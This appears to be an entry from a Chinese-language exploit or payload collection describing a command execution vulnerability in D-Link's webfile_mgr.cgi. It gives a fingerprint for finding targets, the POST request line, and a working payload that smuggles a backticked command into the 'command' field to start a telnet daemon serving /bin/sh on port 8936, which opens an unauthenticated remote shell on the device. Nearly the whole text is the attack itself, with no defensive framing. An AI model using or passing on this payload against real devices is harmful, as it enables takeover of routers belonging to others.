# D-Linkwebfile_mgr.cgi存在命令执行漏洞

D-Linkwebfile_mgr.cgi ｜ 命令执行 ｜ —
- **指纹**：`"D-Link-DIR"`
- **请求**：`POST /cgi-bin/webfile\_mgr.cgi HTTP/1.1`

**Payload**
```
cmd=cgi\_add\_zip\&command=`utelnetd -p 8936 -l /bin/sh`\&select\_name=\&name=\&path=
```
- **响应特征**：200